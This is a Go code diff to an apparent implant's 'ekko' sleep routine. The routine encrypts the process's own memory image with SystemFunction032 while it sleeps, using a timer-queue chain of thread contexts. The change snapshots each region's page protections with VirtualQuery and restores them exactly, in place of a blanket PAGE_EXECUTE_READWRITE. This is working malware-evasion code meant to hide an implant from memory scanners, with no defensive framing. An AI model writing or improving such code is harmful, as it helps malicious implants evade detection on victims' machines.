@@ -132,11 +132,21 @@ type chainTail struct {
 
 func ekko(sleepTime uint64, peers []windows.Handle) error {
 
+	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
+	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
+	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
+
+	// Snapshot the image's page protections now, so the chain can put back exactly these.
+	regions, err := imageRegions(ImageBase, uintptr(nt_header.OptionalHeader.SizeOfImage))
+	if err != nil {
+		return err
+	}
+
 	// Everything the timer thread reads or writes lives in one VirtualAlloc
 	// block: it never moves, the GC never frees it, and it's page-aligned, so
 	// every CONTEXT is 16-byte aligned. It's outside the image, so it stays
 	// readable while the image is encrypted.
-	nCtx := 2*len(peers) + 10 // 2n+8 steps + scratch + capture
+	nCtx := 2*len(peers) + len(regions) + 9 // 2n+R+7 steps + scratch + capture
 	ctxBytes := uintptr(nCtx) * unsafe.Sizeof(CONTEXT{})
 	base, err := windows.VirtualAlloc(0, ctxBytes+unsafe.Sizeof(chainTail{}), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
@@ -155,9 +165,7 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	t.Key.Buffer = &t.KeyBuf[0]
 	t.Key.Length = uint32(len(t.KeyBuf))
 
-	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
-	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
-	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
+
 	t.Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
 	t.Img.Length = nt_header.OptionalHeader.SizeOfImage
 
@@ -204,7 +212,10 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 5)        // encrypt
 	queue(step(CtxThread, procWaitForSingleObject.Addr(), self, sleepTime), 6) // sleep
 	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 7)        // decrypt
-	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, windows.PAGE_EXECUTE_READWRITE, pOld), 8)
+	// put every region back as it was; order inside the phase doesn't matter
+	for _, r := range regions {
+		queue(step(CtxThread, procVirtualProtect.Addr(), uint64(r.base), uint64(r.size), uint64(r.prot), pOld), 8)
+	}
 	queue(step(CtxThread, procNtResumeProcess.Addr(), self), 9)
 	queue(step(CtxThread, procSetEvent.Addr(), uint64(hEvent)), 10)
 
@@ -229,3 +240,29 @@ func step(base *CONTEXT, fn uintptr, args ...uint64) CONTEXT {
 	}
 	return c
 }
+
+// region is one run of pages in the image that share a protection.
+type region struct {
+	base, size uintptr
+	prot       uint32
+}
+
+// imageRegions lists the image's page protections, so the chain can restore
+// exactly what the loader set (.text RX, .rdata R, .data RW, ...) instead of
+// one protection for everything.
+func imageRegions(imageBase, imageSize uintptr) ([]region, error) {
+	var out []region
+	end := imageBase + imageSize
+	for addr := imageBase; addr < end; {
+		var mbi windows.MemoryBasicInformation
+		if err := windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
+			return nil, err
+		}
+		next := min(mbi.BaseAddress+mbi.RegionSize, end)
+		out = append(out, region{addr, next - addr, mbi.Protect})
+		addr = next
+	}
+	return out, nil
+}
+
+
